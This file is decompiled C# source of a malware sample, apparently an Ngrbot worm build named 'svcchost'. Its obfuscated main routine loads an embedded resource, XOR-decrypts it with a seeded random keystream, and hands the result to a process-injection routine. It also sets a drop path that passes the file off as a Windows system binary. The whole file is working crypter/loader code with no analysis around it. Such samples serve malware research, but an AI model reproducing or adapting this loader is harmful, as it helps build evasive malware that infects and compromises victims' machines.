// Decompiled with JetBrains decompiler
// Type: svcchost.ƦȝąƋƦȝƨøυṟcȝ
// Assembly: svcchost, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 08BB3140-5D00-4E7B-85E3-720CFAC816B7
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00007-msil\Worm.Win32.Ngrbot.dvq-62ed2e37a642b15c0487d42e636d3b602ad316b72a22d53d0a48abe94e72b9a3.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace svcchost
{
  [StandardModule]
  internal sealed class ƦȝąƋƦȝƨøυṟcȝ
  {
    private static object ƉȝƨƫƚŋąƫƚøŋƑƚƪȝ = (object) (Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Microsoft\\Protect\\Credentials\\svcchost.exe");
    private static object ƧøυṟcȝƑƚƪȝ = (object) Process.GetCurrentProcess().MainModule.ModuleName;

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern IntPtr FindResource(IntPtr ħМøƋυƪȝ, string ƪƥŊąɱȝ, string ƪƥƬƴƥȝ);

    [DllImport("kernel32", EntryPoint = "GetModuleHandleA", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern IntPtr GetModuleHandle([MarshalAs(UnmanagedType.VBByRefStr)] ref string moduleName);

    [DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern IntPtr LoadResource(IntPtr ħМøƋυƪȝ, IntPtr ƥυƪąɱȝą);

    [DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int SizeofResource(IntPtr ħМøƋυƪȝ, IntPtr ƥυƪąɱȝą);

    [STAThread]
    public static void main()
    {
      string moduleName = Process.GetCurrentProcess().MainModule.ModuleName;
      IntPtr moduleHandle = ƦȝąƋƦȝƨøυṟcȝ.GetModuleHandle(ref moduleName);
      IntPtr resource = ƦȝąƋƦȝƨøυṟcȝ.FindResource(moduleHandle, "0", "RT_RCDATA");
      IntPtr source = ƦȝąƋƦȝƨøυṟcȝ.LoadResource(moduleHandle, resource);
      int length = ƦȝąƋƦȝƨøυṟcȝ.SizeofResource(moduleHandle, resource);
      byte[] numArray = new byte[checked (length - 1 + 1 - 1 + 1)];
      Marshal.Copy(source, numArray, 0, length);
      int int32_1 = BitConverter.ToInt32(numArray, Convert.ToInt32(checked (numArray.Length - 4)));
      byte[] Ƌąƫą = (byte[]) Utils.CopyArray((Array) numArray, (Array) new byte[checked (numArray.Length - 3 + 1 - 1 + 1)]);
      Random random = new Random(int32_1);
      byte[] buffer = new byte[checked (Ƌąƫą.Length - 1 + 1 - 1 + 1)];
      random.NextBytes(buffer);
      int int32_2 = Convert.ToInt32(checked (Ƌąƫą.Length - 1));
      int index = 0;
      while (index <= int32_2)
      {
        Ƌąƫą[index] = Convert.ToByte((byte) ((int) Ƌąƫą[index] ^ (int) buffer[index]));
        checked { ++index; }
      }
      Ʀυŋƥȝƪąƨƨ.ƦυŋƥȝƧυƀ(Ƌąƫą, Conversions.ToString(ƦȝąƋƦȝƨøυṟcȝ.ƧøυṟcȝƑƚƪȝ));
    }
  }
}
